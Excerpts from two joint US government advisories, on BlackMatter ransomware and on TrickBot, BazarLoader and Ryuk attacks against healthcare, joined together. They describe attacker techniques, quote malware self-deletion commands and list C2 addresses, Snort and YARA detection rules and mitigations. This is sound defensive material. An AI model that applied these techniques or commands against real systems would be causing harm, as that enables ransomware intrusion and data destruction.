reformat\nbackup data stores and appliances.\nTable 1 maps BlackMatter’s capabilities to the MITRE ATT&CK for Enterprise framework, based on\nthe analyzed variant and trusted third-party reporting.\nTable 1: BlackMatter Actors and Ransomware TTPs\nTactic\n\nTechnique\n\nProcedure\n\nPersistence\n[TA0003]\n\nExternal Remote Services\n[T1133]\n\nBlackMatter leverages legitimate remote\nmonitoring and management software\nand remote desktop software, often by\n\nPage 2 of 7 | Product ID: AA21-291A\nTLP: WHITE\n\nCISA | FBI | NSA\n\nTLP:WHITE\n\nDraft\nTactic\n\nTechnique\n\nProcedure\nsetting up trial accounts, to maintain\npersistence on victim networks.\n\nCredential Access\n[TA0006]\n\nOS Credential Dumping: LSASS\nMemory [T1003.001]\n\nBlackMatter harvests credentials from\nLocal Security Authority Subsystem\nService (LSASS) memory using procmon.\n\nDiscovery\n[TA0007]\n\nRemote System Discovery\n[T1018]\n\nBlackMatter leverages LDAP and SMB\nprotocol to discover all hosts in the AD.\n\nProcess Discovery [T1057]\n\nBlackMatter uses\nNtQuerySystemInformation to\nenumerate running processes.\n\nSystem Service Discovery\n[T1007]\n\nBlackMatter uses\nEnumServicesStatusExW to enumerate\nrunning services on the network.\n\nLateral Movement\n[TA0008]\n\nRemote Services: SMB/Windows\nAdmin Shares [T1021.002]\n\nBlackMatter uses\nsrvsvc.NetShareEnumAll MSRPC\nfunction to enumerate and SMB to\nconnect to all discovered shares,\nincluding ADMIN$, C$, SYSVOL, and\nNETLOGON.\n\nExfiltration\n[TA0010]\n\nExfiltration Over Web Service\n[T1567]\n\nBlackMatter attempts to exfiltrate data for\nextortion.\n\nImpact [TA0040]\n\nData Encrypted for Impact\n[T1486]\n\nBlackMatter remotely encrypts shares via\nSMB protocol and drops a ransomware\nnote in each directory.\n\nDisk Wipe [T1561]\n\nBlackMatter may wipe backup systems.\n\nDETECTION SIGNATURES\nThe following Snort signatures may be used for detecting network activity associated with BlackMatter\nactivity.\nIntrusion Detection System Rule:\nalert tcp any any -> any 445 ( msg:\"BlackMatter remote encryption attempt\";\ncontent:\"|01 00 00 00 00 00 05 00 01 00|\"; content:\"|2e 00 52 00 45 00 41 00 44\n00 4d 00 45 00 2e 00 74 00|\"; distance:100; detection_filter: track by_src, count\n4, seconds 1; priority:1; sid:11111111111; )\n\nPage 3 of 7 | Product ID: AA21-291A\nTLP: WHITE\n\nCISA | FBI | NSA\n\nTLP:WHITE\n\nDraft\nInline Intrusion Prevention System Rule:\nalert tcp any any -> any 445 ( msg:\"BlackMatter remote encryption attempt\";\ncontent:\"|01 00 00 00 00 00 05 00 01 00|\"; content:\"|2e 00 52 00 45 00 41 00 44\n00 4d 00 45 00 2e 00 74 00|\"; distance:100; priority:1; sid:10000001; )\nrate_filter gen_id 1, sig_id 10000001, track by_src, count 4, seconds 1,\nnew_action reject, timeout 86400\n\nMITIGATIONS\nCISA, the FBI, and NSA urge network defenders, especially for critical infrastructure organizations, to\napply the following mitigations to reduce the risk of compromise by BlackMatter ransomware:\n\nImplement Detection Signatures\n\n\nImplement the detection signatures identified above. These signatures will identify and\nblock placement of the ransom note on the first share that is encrypted, subsequently blocking\nadditional SMB traffic from the encryptor system for 24 hours.\n\nUse Strong Passwords\n\n\nRequire all accounts with password logins (e.g., service account, admin accounts, and\ndomain admin accounts) to have strong, unique passwords. Passwords should not be\nreused across multiple accounts or stored on the system where an adversary may have\naccess. Note: devices with local administrative accounts should implement a password policy\nthat requires strong, unique passwords for each individual administrative account.\n\nImplement Multi-Factor Authentication\n\n\nRequire multi-factor authentication for all services to the extent possible, particularly for\nwebmail, virtual private networks, and accounts that access critical systems.\n\nPatch and Update Systems\n\n\nKeep all operating systems and software up to date. Timely patching is one of the most\nefficient and cost-effective steps an organization can take to minimize its exposure to\ncybersecurity threats.\n\nLimit Access to Resources over the Network\n\n\n\n\nRemove unnecessary access to administrative shares, especially ADMIN$ and C$. If\nADMIN$ and C$ are deemed operationally necessary, restrict privileges to only the necessary\nservice or user accounts and perform continuous monitoring for anomalous activity.\nUse a host-based firewall to only allow connections to administrative shares via SMB from a\nlimited set of administrator machines.\n\nPage 4 of 7 | Product ID: AA21-291A\nTLP: WHITE\n\nCISA | FBI | NSA\n\nTLP:WHITE\n\nDraft\n\nImplement Network Segmentation and Traversal Monitoring\nAdversaries use system and network discovery techniques for network and system visibility and\nmapping. To limit an adversary from learning the organization’s enterprise environment, limit common\nsystem and network discovery techniques by taking the following actions.\n\n\n\n\nSegment networks to prevent the spread of ransomware. Network segmentation can help\nprevent the spread of ransomware by controlling traffic flows between—and access to—\nvarious subnetworks and by restricting adversary lateral movement.\nIdentify, detect, and investigate abnormal activity and potential traversal of the\nindicated ransomware with a networking monitoring tool. To aid in detecting the\nransomware, implement a tool that logs and reports all network traffic, including lateral\nmovement activity on a network. Endpoint detection and response (EDR) tools are particularly\nuseful for detecting lateral connections as they have insight into common and uncommon\nnetwork connections for each host.\n\nUse Admin Disabling Tools to Support Identity and Privileged Access Management\nIf BlackMatter uses compromised credentials during non-business hours, the compromise may not be\ndetected. Given that there has been an observed increase in ransomware attacks during nonbusiness hours, especially holidays and weekends, CISA, the FBI, and NSA recommend\norganizations:\n\n\n\n\nImplement time-based access for accounts set at the admin level and higher. For\nexample, the Just-in-Time (JIT) access method provisions privileged access when needed\nand can support enforcement of the principle of least privilege (as well as the Zero Trust\nmodel). This is a process where a network-wide policy is set in place to automatically disable\nadmin accounts at the AD level when the account is not in direct need. When the account is\nneeded, individual users submit their requests through an automated process that enables\naccess to a system, but only for a set timeframe to support task completion.\nDisable command-line and scripting activities and permissions. Privilege escalation and\nlateral movement often depend on software utilities that run from the command line. If threat\nactors are not able to run these tools, they will have difficulty escalating privileges and/or\nmoving laterally.\n\nImplement and Enforce Backup and Restoration Policies and Procedures\n\n\n\n\nMaintain offline backups of data, and regularly maintain backup and restoration. This\npractice will ensure the organization will not be severely interrupted, have irretrievable data, or\nbe held up by a ransom demand.\nEnsure all backup data is encrypted, immutable (i.e., cannot be altered or deleted) and\ncovers the entire organization’s data infrastructure.\n\nPage 5 of 7 | Product ID: AA21-291A\nTLP: WHITE\n\nCISA | FBI | NSA\n\nTLP:WHITE\n\nDraft\nCISA, the FBI, and NSA urge critical infrastructure organizations to apply the following additional\nmitigations to reduce the risk of credential compromise.\n\n\n\n\n\n\nDisable the storage of clear text passwords in LSASS memory.\nConsider disabling or limiting New Technology Local Area Network Manager (NTLM)\nand WDigest Authentication.\nImplement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage\nWindows Defender Credential Guard for more information). For Windows Server 2012R2,\nenable Protected Process Light for Local Security Authority (LSA).\nMinimize the AD attack surface to reduce malicious ticket-granting activity. Malicious activity\nsuch as “Kerberoasting” takes advantage of Kerberos’ Ticket Granting service and can be\nused to obtain hashed credentials that attackers attempt to crack.\no Set a strong password policy for service accounts.\no Audit Domain Controllers to log successful Kerberos Ticket-Granting Service requests\nand ensure the events are monitored for anomalous activity.\n\nRefer to the CISA-Multi-State information and Sharing Center (MS-ISAC) Joint Ransomware Guide\nfor general mitigations to prepare for and reduce the risk of compromise by ransomware attacks.\nNote: critical infrastructure organizations with industrial control systems/operational technology\nnetworks should review joint CISA-FBI Cybersecurity Advisory AA21-131A: DarkSide Ransomware:\nBest Practices for Preventing Business Disruption from Ransomware Attacks for more mitigations,\nincluding mitigations to reduce the risk of severe business or functional degradation should their entity\nfall victim to a ransomware attack.\n\nRESPONDING TO RANSOMWARE ATTACKS\nIf a ransomware incident occurs at your organization, CISA, the FBI, and NSA recommend:\n\n\n\n\n\nFollowing the Ransomware Response Checklist on p. 11 of the CISA-Multi-State\nInformation Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.\nScanning backups. If possible, scan backup data with an antivirus program to check that it is\nfree of malware.\nReporting incidents immediately to the FBI at a local FBI Field Office, CISA at uscert.cisa.gov/report, or the U.S. Secret Service at a U.S. Secret Service Field Office.\nApplying incident response best practices found in the joint Advisory, Technical\nApproaches to Uncovering and Remediating Malicious Activity, developed by CISA and the\ncybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.\n\nNote: CISA, the FBI, and NSA strongly discourage paying a ransom to criminal actors. Paying a\nransom may embolden adversaries to target additional organizations, encourage other criminal actors\nto engage in the distribution of ransomware, and/or may fund illicit activities. Paying the ransom also\ndoes not guarantee that a victim’s files will be recovered.\n\nPage 6 of 7 | Product ID: AA21-291A\nTLP: WHITE\n\nCISA | FBI | NSA\n\nTLP:WHITE\n\nDraft\n\nRESOURCES\n\n\n\n\n\n\nFor more information and resources on protecting against and responding to ransomware,\nrefer to StopRansomware.gov, a centralized, whole-of-government webpage providing\nransomware resources and alerts.\nCISA’s Ransomware Readiness Assessment (RRA) is a no-cost self-assessment based on a\ntiered set of practices to help organizations better assess how well they are equipped to\ndefend and recover from a ransomware incident.\nCISA offers a range of no-cost cyber hygiene services to help critical infrastructure\norganizations assess, identify, and reduce their exposure to threats, including ransomware. By\nrequesting these services, organizations of any size could find ways to reduce their risk and\nmitigate attack vectors.\n\nNote: the information you have accessed or received is being provided “as is” for informational\npurposes only.

See the ATT&CK for Enterprise version 7 for all referenced threat \nactor tactics and techniques. \n\nSUMMARY \nThis joint cybersecurity advisory was coauthored by the Cybersecurity and Infrastructure Security \nAgency (CISA), the Federal Bureau of Investigation (FBI), and the Department of Health and Human \nServices (HHS). This advisory describes the tactics, techniques, and procedures (TTPs) used by \ncybercriminals against targets in the Healthcare and Public Health Sector (HPH) to infect systems \nwith ransomware, notably Ryuk and Conti, for financial gain.  \n\nCISA, FBI, and HHS have credible information of an increased and imminent cybercrime threat to \nU.S. hospitals and healthcare providers. CISA, FBI, and HHS are sharing this information to provide \nwarning to healthcare providers to ensure that they take timely and reasonable precautions to protect \ntheir networks from these threats. \n\nKey Findings \n• CISA, FBI, and HHS assess malicious cyber actors are targeting the HPH Sector with TrickBot \n\nand BazarLoader malware, often leading to ransomware attacks, data theft, and the disruption \nof healthcare services.  \n\n• These issues will be particularly challenging for organizations within the COVID-19 pandemic; \ntherefore, administrators will need to balance this risk when determining their cybersecurity \ninvestments.  \n\nTECHNICAL DETAILS \nThreat Details \nThe cybercriminal enterprise behind TrickBot, which is likely also the creator of BazarLoader \nmalware, has continued to develop new functionality and tools, increasing the ease, speed, and \nprofitability of victimization. These threat actors increasingly use loaders—like TrickBot and \nBazarLoader (or BazarBackdoor)—as part of their malicious cyber campaigns. Cybercriminals \n\nTo report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact \nyour local FBI field office at or the FBI’s 24/7 Cyber Watch (CyWatch) at  \n(855) 292-3937 or by e-mail at When available, please include the following information\nregarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of \nequipment used for the activity; the name of the submitting company or organization; and a designated point of \ncontact.

Loaders start the infection chain by \ndistributing the payload; they deploy and execute the backdoor from the C2 server and install it on the \nvictim’s machine. \n\nTrickBot \nWhat began as a banking trojan and descendant of Dyre malware, TrickBot now provides its \noperators a full suite of tools to conduct a myriad of illegal cyber activities. These activities include \ncredential harvesting, mail exfiltration, cryptomining, point-of-sale data exfiltration, and the \ndeployment of ransomware, such as Ryuk and Conti.  \n\nIn early 2019, FBI began to observe new TrickBot modules named Anchor, which cyber actors \ntypically used in attacks targeting high-profile victims—such as large corporations. These attacks \noften involved data exfiltration from networks and point-of-sale devices. As part of the new Anchor \ntoolset, TrickBot developers created anchor_dns, a tool for sending and receiving data from victim \nmachines using Domain Name System (DNS) tunneling. \n\nanchor_dns is a backdoor that allows victim machines to communicate with command and control \n(C2) servers over DNS to evade typical network defense products and make their malicious \ncommunications blend in with legitimate DNS traffic. anchor_dns uses a single-byte XOR cipher to \nencrypt its communications, which have been observed using key 0xB9. Once decrypted, the string \nanchor_dns can be found in the DNS request traffic. \n\nTrickBot Indicators of Compromise \n\nAfter successful execution of the malware, TrickBot copies itself as an executable file with a 12-\ncharacter (includes .exe), randomly generated file name (e.g. mfjdieks.exe) and places this file in \none of the following directories. \n\n• C:\\Windows\\ \n• C:\\Windows\\SysWOW64\\ \n• C:\\Users\\[Username]\\AppData\\Roaming\\  \n\nOnce the executable is running and successful in establishing communication with C2s, the \nexecutable places appropriate modules downloaded from C2s for the infected processor architecture \ntype (32 or 64 bit instruction set), to the infected host’s %APPDATA% or %PROGRAMDATA% directory, such \nas %AppData\\Roaming\\winapp. Some commonly named plugins that are created in a Modules \nsubdirectory are (the detected architecture is appended to the module filename, e.g., importDll32 or \nimportDll64): \n\n• Systeminfo \n• importDll \n• outlookDll \n• injectDll with a directory (ex. injectDLL64_configs) containing configuration files: \n\no dinj \no sinj \n\n\n\n   \n \n \n\n  \nPage 4 of 22 |  Product ID: AA20-302A \n\nTLP:WHITE CISA  | FBI  | HHS \n     \n\nTLP:WHITE   \n\no dpost \n• mailsearcher with a directory (ex. mailsearcher64_configs) containing configuration file: \n\no mailconf \n• networkDll with a directory (ex. networkDll64_configs) containing configuration file: \n\no dpost \n• wormDll \n• tabDll \n• shareDll \n\nFilename client_id or data or FAQ with the assigned bot ID of the compromised system is created \nin the malware directory. Filename group_tag or Readme.md containing the TrickBot campaign IDs is \ncreated in the malware directory. \n\nThe malware may also drop a file named anchorDiag.txt in one of the directories listed above.  \n\nPart of the initial network communications with the C2 server involves sending information about the \nvictim machine such as its computer name/hostname, operating system version, and build via a \nbase64-encoded GUID. The GUID is composed of /GroupID/ClientID/ with the following naming \nconvention: \n\n/anchor_dns/[COMPUTERNAME]_[WindowsVersionBuildNo].[32CharacterString]/. \n\nThe malware uses scheduled tasks that run every 15 minutes to ensure persistence on the victim \nmachine. The scheduled task typically uses the following naming convention. \n\n[random_folder_name_in_%APPDATA%_excluding_Microsoft] \nautoupdate#[5_random_numbers] (e.g., Task autoupdate#16876). \n\nAfter successful execution, anchor_dns further deploys malicious batch scripts (.bat) using \nPowerShell commands. \n\nThe malware deploys self-deletion techniques by executing the following commands. \n\n• cmd.exe /c timeout 3 && del C:\\Users\\[username]\\[malware_sample] \n\n• cmd.exe /C PowerShell \\\"Start-Sleep 3; Remove-Item \nC:\\Users\\[username]\\[malware_sample_location]\\\" \n\nThe following domains found in outbound DNS records are associated with anchor_dns. \n\n• kostunivo[.]com \n• chishir[.]com \n• mangoclone[.]com \n• onixcellent[.]com \n\nThis malware used the following legitimate domains to test internet connectivity. \n\n• ipecho[.]net \n• api[.]ipify[.]org \n\n\n\n   \n \n \n\n  \nPage 5 of 22 |  Product ID: AA20-302A \n\nTLP:WHITE CISA  | FBI  | HHS \n     \n\nTLP:WHITE   \n\n• checkip[.]amazonaws[.]com \n• ip[.]anysrc[.]net \n• wtfismyip[.]com \n• ipinfo[.]io \n• icanhazip[.]com \n• myexternalip[.]com \n• ident[.]me \n\nCurrently, there is an open source tracker for Trickbot C2 servers located at \nhttps://feodotracker.abuse.ch/browse/trickbot/. \n\nThe anchor_dns malware historically used the following C2 servers. \n\n• 23[.]95[.]97[.]59 \n• 51[.]254[.]25[.]115 \n• 193[.]183[.]98[.]66 \n• 91[.]217[.]137[.]37 \n• 87[.]98[.]175[.]85 \n\nTrickBot YARA Rules \n\nrule anchor_dns_strings_filenames { \n\n    meta: \n\n        description = \"Rule to detect AnchorDNS samples based off strings or \nfilenames used in malware\" \n\n        author = \"NCSC\" \n\n        hash1 = \"fc0efd612ad528795472e99cae5944b68b8e26dc\" \n\n        hash2 = \"794eb3a9ce8b7e5092bb1b93341a54097f5b78a9\" \n\n        hash3 = \"9dfce70fded4f3bc2aa50ca772b0f9094b7b1fb2\" \n\n        hash4 = \"24d4bbc982a6a561f0426a683b9617de1a96a74a\" \n\n    strings: \n\n        $ = \",Control_RunDLL \\x00\" \n\n        $ = \":$GUID\" ascii wide \n\n        $ = \":$DATA\" ascii wide \n\n        $ = \"/1001/\" \n\n        $ = /(\\x00|\\xCC)qwertyuiopasdfghjklzxcvbnm(\\x00|\\xCC)/ \n\n        $ = /(\\x00|\\xCC)QWERTYUIOPASDFGHJKLZXCVBNM(\\x00|\\xCC)/ \n\nhttps://feodotracker.abuse.ch/browse/trickbot/\n\n\n   \n \n \n\n  \nPage 6 of 22 |  Product ID: AA20-302A \n\nTLP:WHITE CISA  | FBI  | HHS \n     \n\nTLP:WHITE   \n\n        $ = \"start program with cmdline \\\"%s\\\"\" \n\n        $ = \"Global\\\\fde345tyhoVGYHUJKIOuy\" \n\n        $ = \"ChardWorker::thExecute: error registry me\" \n\n        $ = \"get command: incode %s, cmdid \\\"%s\\\", cmd \\\"%s\\\"\" \n\n        $ = \"anchorDNS\" \n\n        $ = \"Anchor_x86\" \n\n        $ = \"Anchor_x64\" \n\n    condition: \n\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and 3 of them \n\n} \n\n \n\nrule anchor_dns_icmp_transport { \n\n    meta: \n\n        description = \"Rule to detect AnchorDNS samples based off ICMP transport \nstrings\" \n\n        author = \"NCSC\" \n\n        hash1 = \"056f326d9ab960ed02356b34a6dcd72d7180fc83\" \n\n    strings: \n\n        $ = \"reset_connection <- %s\" \n\n        $ = \"server_ok <- %s (packets on server %s)\" \n\n        $ = \"erase successfully transmitted packet (count: %d)\" \n\n        $ = \"Packet sended with crc %s -> %s\" \n\n        $ = \"send data confimation to server(%s)\" \n\n        $ = \"data recived from <- %s\" \n\n        $ = \"Rearmost packed recived (id: %s)\" \n\n        $ = \"send poll to server -> : %s\" \n\n    condition: \n\n        (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and 3 of them \n\n} \n\n \n\n\n\n   \n \n \n\n  \nPage 7 of 22 |  Product ID: AA20-302A \n\nTLP:WHITE CISA  | FBI  | HHS \n     \n\nTLP:WHITE   \n\nrule anchor_dns_config_dexor { \n\n    meta: \n\n        description = \"Rule to detect AnchorDNS samples based off configuration \ndeobfuscation (XOR 0x23 countup)\" \n\n        author = \"NCSC\" \n\n        hash1 = \"d0278ec015e10ada000915a1943ddbb3a0b6b3db\" \n\n        hash2 = \"056f326d9ab960ed02356b34a6dcd72d7180fc83\" \n\n    strings: \n\n        $x86 = {75 1F 56 6A 40 B2 23 33 C9 5E 8A 81 ?? ?? ?? ?? 32 C2 FE C2 88 81 \n?? ?? ?? ?? 41 83 EE 01 75 EA 5E B8 ?? ?? ?? ??

Campaigns using \nBazar represent a new technique for cybercriminals to infect and monetize networks and have \nincreasingly led to the deployment of ransomware, including Ryuk. BazarLoader has become one of \nthe most commonly used vectors for ransomware deployment. \n\nDeployment of the BazarLoader malware typically comes from phishing email and contains the \nfollowing: \n\n• Phishing emails are typically delivered by commercial mass email delivery services. Email \nreceived by a victim will contain a link to an actor-controlled Google Drive document or other \nfree online filehosting solutions, typically purporting to be a PDF file. \n\n• This document usually references a failure to create a preview of the document and contains a \nlink to a URL hosting a malware payload in the form of a misnamed or multiple extension file. \n\n• Emails can appear as routine, legitimate business correspondence about customer \ncomplaints, hiring decision, or other important tasks that require the attention of the recipient.   \n\n• Some email communications have included the recipient’s name or employer name in the \nsubject line and/or email body. \n\nThrough phishing emails linking users to Google Documents, actors used the below identified file \nnames to install BazarLoader: \n\n• Report-Review26-10.exe \n• Review_Report15-10.exe \n• Document_Print.exe \n• Report10-13.exe \n• Text_Report.exe \n\nBazar activity can be identified by searching the system startup folders and Userinit values under the \nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon registry key: \n\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\adobe.lnk \n\n\n\n   \n \n \n\n  \nPage 12 of 22 |  Product ID: AA20-302A \n\nTLP:WHITE CISA  | FBI  | HHS \n     \n\nTLP:WHITE   \n\nFor a comprehensive list of indicators of compromise regarding the BazarLocker malware, see \nhttps://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-\nchaser.html. \n\nIndicators \nIn addition to TrickBot and BazarLoader, threat actors are using malware, such as KEGTAP, \nBEERBOT, SINGLEMALT, and others as they continue to change tactics, techniques, and \nprocedures in their highly dynamic campaign.1 The following C2 servers are known to be associated \nwith this malicious activity.  \n\n• 45[.]148[.]10[.]92  \n• 170[.]238[.]117[.]187 \n• 177[.]74[.]232[.]124 \n• 185[.]68[.]93[.]17 \n• 203[.]176[.]135[.]102 \n• 96[.]9[.]73[.]73 \n• 96[.]9[.]77[.]142 \n• 37[.]187[.]3[.]176 \n• 45[.]89[.]127[.]92 \n• 62[.]108[.]35[.]103 \n• 91[.]200[.]103[.]242 \n• 103[.]84[.]238[.]3 \n• 36[.]89[.]106[.]69 \n• 103[.]76[.]169[.]213 \n• 36[.]91[.]87[.]227 \n• 105[.]163[.]17[.]83 \n• 185[.]117[.]73[.]163 \n• 5[.]2[.]78[.]118 \n• 185[.]90[.]61[.]69 \n• 185[.]90[.]61[.]62 \n• 86[.]104[.]194[.]30 \n• 31[.]131[.]21[.]184 \n• 46[.]28[.]64[.]8 \n• 104[.]161[.]32[.]111 \n• 107[.]172[.]140[.]171 \n• 131[.]153[.]22[.]148 \n• 195[.]123[.]240[.]219 \n• 195[.]123[.]242[.]119 \n\n                                                 \n\n1 FireEye: Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser \n\nhttps://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nhttps://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nhttps://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html?&web_view=true\n\n\n   \n \n \n\n  \nPage 13 of 22 |  Product ID: AA20-302A \n\nTLP:WHITE CISA  | FBI  | HHS \n     \n\nTLP:WHITE   \n\n• 195[.]123[.]242[.]120 \n• 51[.]81[.]113[.]25 \n• 74[.]222[.]14[.]27 \n\nRyuk Ransomware \nTypically Ryuk has been deployed as a payload from banking Trojans such as TrickBot.2 Ryuk first \nappeared in August 2018 as a derivative of Hermes 2.1 ransomware, which first emerged in late 2017 \nand was available for sale on the open market as of August 2018. Ryuk still retains some aspects of \nthe Hermes code. For example, all of the files encrypted by Ryuk contain the HERMES tag but, in some \ninfections, the files have .ryk added to the filename, while others do not. In other parts of the \nransomware code, Ryuk has removed or replaced features of Hermes, such as the restriction against \ntargeting specific Eurasia-based systems. \n\nWhile negotiating the victim network, Ryuk actors will commonly use commercial off-the-shelf \nproducts—such as Cobalt Strike and PowerShell Empire—in order to steal credentials. Both \nframeworks are very robust and are highly effective dual-purpose tools, allowing actors to dump clear \ntext passwords or hash values from memory with the use of Mimikatz. This allows the actors to inject \nmalicious dynamic-link library into memory with read, write, and execute permissions. In order to \nmaintain persistence in the victim environment, Ryuk actors have been known to use scheduled tasks \nand service creation. \n\nRyuk actors will quickly map the network in order to enumerate the environment to understand the \nscope of the infection. In order to limit suspicious activity and possible detection, the actors choose to \nlive off the land and, if possible, use native tools—such as net view, net computers, and ping—to \nlocate mapped network shares, domain controllers, and active directory. In order to move laterally \nthroughout the network, the group relies on native tools, such as PowerShell, Windows Management \nInstrumentation (WMI), Windows Remote Management , and Remote Desktop Protocol (RDP). The \ngroup also uses third-party tools, such as Bloodhound. \n\nOnce dropped, Ryuk uses AES-256 to encrypt files and an RSA public key to encrypt the AES key. \nThe Ryuk dropper drops a .bat file that attempts to delete all backup files and Volume Shadow \nCopies (automatic backup snapshots made by Windows), preventing the victim from recovering \nencrypted files without the decryption program. \n\nIn addition, the attackers will attempt to shut down or uninstall security applications on the victim \nsystems that might prevent the ransomware from executing. Normally this is done via a script, but if \nthat fails, the attackers are capable of manually removing the applications that could stop the attack. \nThe RyukReadMe file placed on the system after encryption provides either one or two email  \n\n                                                 \n\n2 See the United Kingdom (UK) National Cyber Security Centre (NCSC) advisory, Ryuk Ransomware Targeting \nOrganisations Globally, on their ongoing investigation into global Ryuk ransomware campaigns and associated \nEmotet and TrickBot malware. \n\n \n\nhttps://www.ncsc.gov.uk/news/ryuk-advisory\nhttps://www.ncsc.gov.uk/news/ryuk-advisory\n\n\n   \n \n \n\n  \nPage 14 of 22 |  Product ID: AA20-302A \n\nTLP:WHITE CISA  | FBI  | HHS \n     \n\nTLP:WHITE   \n\naddresses, using the end-to-end encrypted email provider Protonmail, through which the victim can \ncontact the attacker(s). While earlier versions provide a ransom amount in the initial notifications, \nRyuk users are now designating a ransom amount only after the victim makes contact. \n\nThe victim is told how much to pay to a specified Bitcoin wallet for the decryptor and is provided a \nsample decryption of two files. \n\nInitial testing indicates that the RyukReadMe file does not need to be present for the decryption script \nto run successfully but other reporting advises some files will not decrypt properly without it. Even if \nrun correctly, there is no guarantee the decryptor will be effective. This is further complicated because \nthe RyukReadMe file is deleted when the script is finished. This may affect the decryption script unless \nit is saved and stored in a different location before running. \n\nAccording to MITRE, Ryuk uses the ATT&CK techniques listed in table 1.  \n\nTable 1: Ryuk ATT&CK techniques \n\nTechnique Use \n\nSystem Network Configuration \nDiscovery [T1016]  \n\nRyuk has called GetIpNetTable in attempt to identify all \nmounted drives and hosts that have Address Resolution \nProtocol entries.   \n\nMasquerading: Match Legitimate \nName or Location [T1036.005]  \n\nRyuk has constructed legitimate appearing installation folder \npaths by calling GetWindowsDirectoryW and then inserting a \nnull byte at the fourth character of the path.

Evaluating continuity and capability will help \nidentify continuity gaps. Through identifying and addressing these gaps, organizations can establish a \nviable continuity program that will help keep them functioning during cyberattacks or other \nemergencies. CISA, FBI, and HHS suggest HPH Sector organizations review or establish patching \nplans, security policies, user agreements, and business continuity plans to ensure they address \ncurrent threats posed by malicious cyber actors.  \n\nNetwork Best Practices  \n• Patch operating systems, software, and firmware as soon as manufacturers release updates.  \n• Check configurations for every operating system version for HPH organization-owned assets \n\nto prevent issues from arising that local users are unable to fix due to having local \nadministration disabled.  \n\n• Regularly change passwords to network systems and accounts and avoid reusing passwords \nfor different accounts. \n\n• Use multi-factor authentication where possible. \n• Disable unused remote access/Remote Desktop Protocol (RDP) ports and monitor remote \n\naccess/RDP logs. \n• Implement application and remote access allow listing to only allow systems to execute \n\nprograms known and permitted by the established security policy. \n• Audit user accounts with administrative privileges and configure access controls with least \n\nprivilege in mind.  \n• Audit logs to ensure new accounts are legitimate.  \n• Scan for open or listening ports and mediate those that are not needed.  \n• Identify critical assets such as patient database servers, medical records, and teleheatlh and \n\ntelework infrastructure; create backups of these systems and house the backups offline from \nthe network. \n\n• Implement network segmentation. Sensitive data should not reside on the same server and \nnetwork segment as the email environment.  \n\n• Set antivirus and anti-malware solutions to automatically update; conduct regular scans. \n\nRansomware Best Practices \nCISA, FBI and HHS do not recommend paying ransoms. Payment does not guarantee files will be \nrecovered. It may also embolden adversaries to target additional organizations, encourage other \ncriminal actors to engage in the distribution of ransomware, and/or fund illicit activities. In addition to \nimplementing the above network best practices, the FBI, CISA and HHS also recommend the \nfollowing:  \n\n• Regularly back up data, air gap, and password protect backup copies offline.  \n• Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary \n\ndata and servers in a physically separate, secure location.  \n\nUser Awareness Best Practices  \n\n\n\n   \n \n \n\n  \nPage 17 of 22 |  Product ID: AA20-302A \n\nTLP:WHITE CISA  | FBI  | HHS \n     \n\nTLP:WHITE   \n\n• Focus on awareness and training. Because end users are targeted, make employees and \nstakeholders aware of the threats—such as ransomware and phishing scams—and how they \nare delivered. Additionally, provide users training on information security principles and \ntechniques as well as overall emerging cybersecurity risks and vulnerabilities.  \n\n• Ensure that employees know who to contact when they see suspicious activity or when they \nbelieve they have been a victim of a cyberattack. This will ensure that the proper established \nmitigation strategy can be employed quickly and efficiently. \n\nRecommended Mitigation Measures \nSystem administrators who have indicators of a TrickBot network compromise should immediately \ntake steps to back up and secure sensitive or proprietary data. TrickBot infections may be indicators \nof an imminent ransomware attack; system administrators should take steps to secure network \ndevices accordingly. Upon evidence of a TrickBot infection, review DNS logs and use the XOR key of \n0xB9 to decode XOR encoded DNS requests to reveal the presence of anchor_dns, and maintain and \nprovide relevant logs. \n\nGENERAL RANSOMWARE MITIGATIONS — HPH SECTOR \nThis section is based on CISA and Multi-State Information Sharing and Analysis Center (MS-ISAC)'s \nJoint Ransomware Guide, which can be found at https://www.cisa.gov/publication/ransomware-guide. \n\nCISA, FBI, and HHS recommend that healthcare organizations implement both ransomware \nprevention and ransomware response meaures immediately. \n\nRansomware Prevention \nJoin and Engage with Cybersecurity Organizations \nCISA, FBI, and HHS recommend that healthcare organizations take the following initial steps: \n\n• Join a healthcare information sharing organization, H-ISAC: \no Health Information Sharing and Analysis Center (H-ISAC): https://h-\n\nisac.org/membership-account/join-h-isac/  \no Sector-based ISACs - National Council of ISACs: \n\nhttps://www.nationalisacs.org/member-isacs  \no Information Sharing and Analysis Organization (ISAO) Standards Organization: \n\nhttps://www.isao.org/information-sharing-groups/  \n\n• Engage with CISA and FBI, as well as HHS—through the HHS Health Sector Cybersecurity \nCoordination Center (HC3)—to build a lasting partnership and collaborate on information \nsharing, best practices, assessments, and exercises. \n\no CISA: cisa.gov, https://us-cert.cisa.gov/mailing-lists-and-feeds, central@cisa.gov   \no FBI: ic3.gov, www.fbi.gov/contact-us/field , CyWatch@fbi.gov  \no HHS/HC3: http://www.hhs.gov/hc3, HC3@HHS.gov 